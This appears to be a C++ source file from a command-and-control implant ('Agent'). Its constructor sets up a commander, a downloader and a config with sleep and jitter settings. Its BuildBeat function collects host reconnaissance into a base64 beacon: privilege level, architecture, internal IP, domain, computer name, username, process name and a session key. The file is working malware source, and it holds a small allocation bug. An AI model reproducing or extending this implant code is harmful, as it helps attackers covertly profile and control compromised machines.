#include "Agent.h"
#include "ApiLoader.h"
#include "utils.h"
#include "Packer.h"
#include "Encoders.h"

Agent::Agent()
{
	info  = (AgentInfo*) MemAllocLocal(sizeof(AgentInfo));
	*info = AgentInfo();
	
	config  = (AgentConfig*) MemAllocLocal(sizeof(AgentConfig));
	*config = AgentConfig();

	commander = (Commander*) MemAllocLocal(sizeof(AgentConfig));
	*commander = Commander(this);

	downloader  = (Downloader*) MemAllocLocal(sizeof(Downloader));
	*downloader = Downloader( config->download_chunk_size );
}

LPSTR Agent::BuildBeat()
{
	BYTE flag = 0;
	flag += this->info->is_server; 
	flag <<= 1;
	flag += this->info->elevated;
	flag <<= 1;
	flag += this->info->sys64;
	flag <<= 1;
	flag += this->info->arch64;

	Packer* packer = (Packer*) MemAllocLocal(sizeof(Packer));
	*packer = Packer();

	packer->Pack32(this->config->agent_type);
	packer->Pack32(this->info->agent_id);
	packer->Pack32(this->config->sleep_delay);
	packer->Pack32(this->config->jitter_delay);
	packer->Pack16(this->info->acp);
	packer->Pack16(this->info->oemcp);
	packer->Pack8(this->info->gmt_offest);
	packer->Pack16(this->info->pid);
	packer->Pack16(this->info->tid);
	packer->Pack32(this->info->build_number);
	packer->Pack8(this->info->major_version);
	packer->Pack8(this->info->minor_version);
	packer->Pack32(this->info->internal_ip);
	packer->Pack8( flag );
	packer->PackBytes(this->config->session_key, 16);
	packer->PackStringA(this->info->domain_name);
	packer->PackStringA(this->info->computer_name);
	packer->PackStringA(this->info->username);
	packer->PackStringA(this->info->process_name);

	PBYTE beat = packer->GetData();
	ULONG beat_size = packer->GetDataSize();

	LPSTR encoded_beat = b64_encode(beat, beat_size);

	return encoded_beat;
}
